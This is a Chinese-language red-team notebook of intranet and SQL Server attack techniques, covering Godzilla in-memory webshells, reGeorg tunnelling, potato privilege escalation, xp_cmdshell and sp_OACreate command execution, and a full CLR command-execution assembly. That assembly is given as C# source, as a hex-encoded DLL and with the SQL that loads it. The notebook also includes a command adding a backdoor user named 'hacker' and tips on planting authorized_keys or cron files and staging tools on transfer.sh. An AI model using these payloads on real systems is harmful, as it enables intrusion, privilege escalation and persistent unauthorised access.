进入内网后，直接快速扫88、389、445端口的特征。serverscan会比较好用。<br />Microsoft-DS traffic: 445/TCP、445/UDP<br />Kerberos: 88/TCP、 88/UDP<br />LDAP ping: 389/UDP <br />DNS: 53/TCP、53/UDP<br />计算机登录与验证身份时会用到的连接端口<br />计算机登录到域控制器时会用到以下的服务，因此如果域的成员计算机与域控制之间被防火墙隔开，就必须在防火墙开放这些服务的连接端口。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615620444239-a02bb77a-92ad-48c8-bdaa-b0b3066b4658.png#height=276&id=JKhvs&originHeight=552&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31400&status=done&style=none&title=&width=399)
<a name="xZA7j"></a>
### 工作组定位域所处位置
1、一样的还是需要serverscan扫445去识别工作组还是域。<br />2、通过浏览器的访问记录，要留意一些网站需要域身份验证，那么该网站的ip(内网ip)的C段可能就有很多域主机<br />3、看端口连接、rdp的登陆记录、凭证等等。

<a name="5xgJL"></a>
## 哥斯拉一键内存马
<a name="YcZ0X"></a>
### webshell内存马

哥斯拉一键注入内存马，实现文件不落地。但是最好是tomcat容器。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616320470365-7d503b5c-d76a-4e8b-a4cd-3e91c59ddc16.png#height=324&id=LjTAw&originHeight=647&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28443&status=done&style=none&title=&width=412.5)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616320504277-968e9436-037e-48da-8b73-a003c2871788.png#height=381&id=CWSXg&originHeight=508&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32618&status=done&style=none&title=&width=413)<br />目标机子查看，并不存在ico文件。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616320550561-032e3deb-df0e-4e86-a98f-32df8e88da44.png#height=252&id=spM6S&originHeight=504&originWidth=779&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43260&status=done&style=none&title=&width=389.5)
<a name="IjKRA"></a>

### 注入regeorg内存，实现隧道脚本不落地
可以和哥斯拉打配合，实现无文件落地，有效载荷选择regeorg

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616321250392-ed063404-7bb8-4527-be01-d32947f5eb8b.png#height=359&id=G44ih&originHeight=478&originWidth=676&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12374&status=done&style=none&title=&width=507)<br />python reGeorgSocksProxy.py -l 0.0.0.0 -p 4444 -u [http://192.168.201.132/re.ico](http://192.168.201.132/re.ico) -r 1024<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616321192832-85108ac2-6e5f-482d-8e00-781b233f8d36.png#height=333&id=q3PJd&originHeight=666&originWidth=1637&originalType=binary&ratio=1&rotation=0&showTitle=false&size=204710&status=done&style=none&title=&width=818.5)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616321352615-b21a5a13-5e43-49b6-b9f7-c1802c90927d.png#height=308&id=Jlucr&originHeight=308&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15521&status=done&style=none&title=&width=554)

<a name="gluEo"></a>
## 关于不出网情况下sqlserver如何提权
<a name="1yp7k"></a>
### 土豆提权
很多时候获取了webshell，内网横向的时候获取了sqlserver权限，但是权限不高。<br />查看目标机子不存在补丁编号KB3164038，那么首选漏洞编号MS16-075，烂土豆进行提权

这个可以适用于webshell情况下提权<br />[https://github.com/uknowsec/SweetPotato](https://github.com/uknowsec/SweetPotato)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617845470502-e67654f9-8013-438e-977f-68bc3c037242.png#height=450&id=zwpSi&originHeight=600&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=211412&status=done&style=none&title=&width=600)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617845432937-fc5e47a3-44f8-45d6-a776-c5adcfe8a324.png#height=699&id=Mkfca&originHeight=932&originWidth=1488&originalType=binary&ratio=1&rotation=0&showTitle=false&size=272845&status=done&style=none&title=&width=1116)
<a name="Mri1g"></a>
### xpcmdshell命令执行
开启xpcmdshell一句话。前提 1、支持堆叠  2、扩展存储过程没被删除
```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
```
exec master..xp_cmdshell "whoami" <br />exec master.dbo.xp_cmdshell 'net user hacker 123456 /add'

如果xpcmdshell组件被删除了，可以想办法把<br />C:\Program Files\Microsoft SQL Server\MSSQL10_50.SQLEXPRESS\MSSQL\Binn目录下的xplog70.dll上传到目标机子进行恢复
```
exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617895104891-69eeff8a-7592-4c12-95dd-674c43925b80.png#height=337&id=S54Gy&originHeight=449&originWidth=764&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39514&status=done&style=none&title=&width=573)
<a name="PydBZ"></a>
### SP_OACreate 命令执行
如果xpcmdshell属实没办法，那就可以用这个命令执行，这个不是提权，只是命令执行，但是没有回显。需要想办法看到内容，可能要配合一些任意文件下载漏洞。
```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;
```
最好写入到temp目录下，因为权限问题原因。这个不是提权，只是命令执行
```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\windows\\temp\\1.txt'
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617896614673-aee557ec-a5eb-46d6-9c09-814d100e2713.png#height=335&id=TqDSp&originHeight=446&originWidth=1010&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50103&status=done&style=none&title=&width=758)

<a name="yozLx"></a>
### CLR提权
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617896708577-842ec2a7-66f7-4f3a-ba38-43998e9fe0ae.png#height=497&id=JF7XX&originHeight=662&originWidth=989&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32218&status=done&style=none&title=&width=742)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617945958618-1e05b7a9-81bd-494c-8a07-8a1bab8256c2.png#height=493&id=np1w7&originHeight=658&originWidth=747&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55500&status=done&style=none&title=&width=560)

```csharp
using System;
using System.Diagnostics;
using System.Text;
using Microsoft.SqlServer.Server;
public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void CmdExec (String cmd)
    {
        // Put your code here
        SqlContext.Pipe.Send(Command("cmd.exe", " /c " + cmd));
    }
 
    public static string Command(string filename, string arguments)
    {
        var process = new Process();
        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }
        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();
            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }
            if (stdOutput.Length != 0)
            {
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
        }
        return stdOutput.ToString();
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617947650846-88155a3b-8baf-437e-bbdc-a30abb5da21b.png#height=553&id=bgu9T&originHeight=737&originWidth=758&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53043&status=done&style=none&title=&width=569)<br />将生成后的dll文件转为16进制，使用winhex打开dll文件，然后右击edit→copy block→Hex value，然后黏贴到文本并在前面加上0x
```csharp
0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300F02B6F600000000000000000E00002210B0108000008000000060000000000004E270000002000000040000000004000002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000FC2600004F00000000400000A802000000000000000000000000000000000000006000000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E7465787400000054070000002000000008000000020000000000000000000000000000200000602E72737263000000A80200000040000000040000000A0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000000E000000000000000000000000000040000042000000000000000000000000000000003027000000000000480000000200050028210000D4050000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600C30000000100001100730400000A0A066F0500000A72010000706F0600000A00066F0500000A72390000700F00280700000A280800000A6F0900000A00066F0500000A166F0A00000A00066F0500000A176F0B00000A00066F0C00000A26178D090000010C081672490000701F0C20A00F00006A730D00000AA208730E00000A0B280F00000A076F1000000A000716066F1100000A6F1200000A6F1300000A6F1400000A00280F00000A076F1500000A00280F00000A6F1600000A00066F1700000A00066F1800000A002A1E02281900000A2A0042534A4201000100000000000C00000076322E302E35303732370000000005006C000000E0010000237E00004C0200008C02000023537472696E677300000000D8040000580000002355530030050000100000002347554944000000400500009400000023426C6F620000000000000002000001471502000900000000FA013300160000010000000F000000020000000200000001000000190000000300000001000000010000000300000000000A000100000000000600380031000A0060004B000600A50085000600C50085000A00FE00E3000E00270114010E002F0114010600650131000A00B601E3000A00C2013F000A00CC01E3000A00DA01E3000A00E501E3000600110207020600310207020000000001000000000001000100010010001700000005000100010050200000000096006A000A0001001F21000000008618730010000200000001007900190073001400210073001000290073001000310073001000310040011E0039004E01230011005B01280041006C012C003900730123003900810132003900950132003100B0013700490073003B005900730043006100ED014A006900F6014F0031001E02550079003C02280009004602280059004F025A00690059024F0069006802100031007702100031008302100009007300100020001B0019002E000B006A002E001300730060000480000000000000000000000000000000006A000000020000000000000000000000010028000000000002000000000000000000000001003F000000000002000000000000000000000001003100000000000000003C4D6F64756C653E00636D645F657865632E646C6C0053746F72656450726F63656475726573006D73636F726C69620053797374656D004F626A6563740053797374656D2E446174610053797374656D2E446174612E53716C54797065730053716C537472696E6700636D645F65786563002E63746F720065786563436F6D6D616E640053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465004D6963726F736F66742E53716C5365727665722E5365727665720053716C50726F6365647572654174747269627574650053797374656D2E446961676E6F73746963730050726F636573730050726F636573735374617274496E666F006765745F5374617274496E666F007365745F46696C654E616D65006765745F56616C756500537472696E6700466F726D6174007365745F417267756D656E7473007365745F5573655368656C6C45786563757465007365745F52656469726563745374616E646172644F75747075740053746172740053716C4D657461446174610053716C4462547970650053716C446174615265636F72640053716C436F6E746578740053716C50697065006765745F506970650053656E64526573756C747353746172740053797374656D2E494F0053747265616D526561646572006765745F5374616E646172644F757470757400546578745265616465720052656164546F456E6400546F537472696E6700536574537472696E670053656E64526573756C7473526F770053656E64526573756C7473456E640057616974466F724578697400436C6F736500000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000F020AF8B5F7C4C4CBC714E06D9F781360008B77A5C561934E0890500010111090320000104200101080401000000042000121D042001010E0320000E0500020E0E1C042001010203200002072003010E11290A062001011D1225040000123505200101122D042000123905200201080E0907031219122D1D12250801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730100002427000000000000000000003E27000000200000000000000000000000000000000000000000000030270000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000D00010049006E007400650072006E0061006C004E0061006D006500000063006D0064005F0065007800650063002E0064006C006C00000000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006D0064005F0065007800650063002E0064006C006C0000000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000503700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```
以下步骤分别执行，其实也可以把go去掉，用分号连接起来。
```csharp
-- Select the msdb database
use msdb
go

-- Enable show advanced options on the server
sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable clr on the server
sp_configure 'clr enabled',1
RECONFIGURE
GO

-- Import the assembly
CREATE ASSEMBLY my_assembly
FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300F02B6F600000000000000000E00002210B0108000008000000060000000000004E270000002000000040000000004000002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000FC2600004F00000000400000A802000000000000000000000000000000000000006000000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E7465787400000054070000002000000008000000020000000000000000000000000000200000602E72737263000000A80200000040000000040000000A0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000000E000000000000000000000000000040000042000000000000000000000000000000003027000000000000480000000200050028210000D4050000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600C30000000100001100730400000A0A066F0500000A72010000706F0600000A00066F0500000A72390000700F00280700000A280800000A6F0900000A00066F0500000A166F0A00000A00066F0500000A176F0B00000A00066F0C00000A26178D090000010C081672490000701F0C20A00F00006A730D00000AA208730E00000A0B280F00000A076F1000000A000716066F1100000A6F1200000A6F1300000A6F1400000A00280F00000A076F1500000A00280F00000A6F1600000A00066F1700000A00066F1800000A002A1E02281900000A2A0042534A4201000100000000000C00000076322E302E35303732370000000005006C000000E0010000237E00004C0200008C02000023537472696E677300000000D8040000580000002355530030050000100000002347554944000000400500009400000023426C6F620000000000000002000001471502000900000000FA013300160000010000000F000000020000000200000001000000190000000300000001000000010000000300000000000A000100000000000600380031000A0060004B000600A50085000600C50085000A00FE00E3000E00270114010E002F0114010600650131000A00B601E3000A00C2013F000A00CC01E3000A00DA01E3000A00E501E3000600110207020600310207020000000001000000000001000100010010001700000005000100010050200000000096006A000A0001001F21000000008618730010000200000001007900190073001400210073001000290073001000310073001000310040011E0039004E01230011005B01280041006C012C003900730123003900810132003900950132003100B0013700490073003B005900730043006100ED014A006900F6014F0031001E02550079003C02280009004602280059004F025A00690059024F0069006802100031007702100031008302100009007300100020001B0019002E000B006A002E001300730060000480000000000000000000000000000000006A000000020000000000000000000000010028000000000002000000000000000000000001003F000000000002000000000000000000000001003100000000000000003C4D6F64756C653E00636D645F657865632E646C6C0053746F72656450726F63656475726573006D73636F726C69620053797374656D004F626A6563740053797374656D2E446174610053797374656D2E446174612E53716C54797065730053716C537472696E6700636D645F65786563002E63746F720065786563436F6D6D616E640053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465004D6963726F736F66742E53716C5365727665722E5365727665720053716C50726F6365647572654174747269627574650053797374656D2E446961676E6F73746963730050726F636573730050726F636573735374617274496E666F006765745F5374617274496E666F007365745F46696C654E616D65006765745F56616C756500537472696E6700466F726D6174007365745F417267756D656E7473007365745F5573655368656C6C45786563757465007365745F52656469726563745374616E646172644F75747075740053746172740053716C4D657461446174610053716C4462547970650053716C446174615265636F72640053716C436F6E746578740053716C50697065006765745F506970650053656E64526573756C747353746172740053797374656D2E494F0053747265616D526561646572006765745F5374616E646172644F757470757400546578745265616465720052656164546F456E6400546F537472696E6700536574537472696E670053656E64526573756C7473526F770053656E64526573756C7473456E640057616974466F724578697400436C6F736500000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000F020AF8B5F7C4C4CBC714E06D9F781360008B77A5C561934E0890500010111090320000104200101080401000000042000121D042001010E0320000E0500020E0E1C042001010203200002072003010E11290A062001011D1225040000123505200101122D042000123905200201080E0907031219122D1D12250801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730100002427000000000000000000003E27000000200000000000000000000000000000000000000000000030270000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000D00010049006E007400650072006E0061006C004E0061006D006500000063006D0064005F0065007800650063002E0064006C006C00000000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006D0064005F0065007800650063002E0064006C006C0000000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000503700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
WITH PERMISSION_SET = UNSAFE;

-- Link the assembly to a stored procedure
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
GO

exec cmd_exec 'whoami'


DROP PROCEDURE cmd_exec
DROP ASSEMBLY my_assembly
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1617949510936-eea15501-d4a4-4ac4-a59d-a6deb5f717a5.png#height=386&id=T2A9Q&originHeight=386&originWidth=488&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16280&status=done&style=none&title=&width=488)
<a name="Df44l"></a>
## 关于任意文件上传漏洞
有时候有任意文件上传漏洞，但是可能没办法传jsp啥的，但是可以传authorized_keys、cron等等获取权限，，具体还得看情况

<a name="nSAUX"></a>
## 实现自动化被动扫描

[https://github.com/timwhitez/crawlergo_x_XRAY](https://github.com/timwhitez/crawlergo_x_XRAY)

主要是xray的被动扫描 + crawlergo的主动爬虫 实现自动化躺着挖洞<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1637994615544-5c9afe64-86ba-4bd0-b441-202a9003d4a3.png#clientId=u5228bf58-0b54-4&from=paste&height=675&id=u06eebb08&originHeight=900&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=937444&status=done&style=none&taskId=u86360ac1-c15e-4e55-9b2b-d6cd6770f1b&title=&width=1080)


## 如何隐藏服务器远程传文件
把需要的文件传到这个第三方平台,然后远程下载<br />[https://transfer.sh/](https://transfer.sh/)

